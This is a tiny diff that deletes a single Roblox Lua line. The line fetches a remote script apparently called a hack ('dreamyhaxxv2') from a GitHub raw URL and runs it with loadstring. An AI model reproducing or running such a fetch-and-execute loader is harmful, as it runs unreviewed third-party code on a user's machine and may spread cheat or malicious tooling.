@@ -1,1 +1,0 @@
-loadstring(game:HttpGet('https://raw.githubusercontent.com/Dreamfooler/dreamyv2/main/dreamyhaxxv2'))()
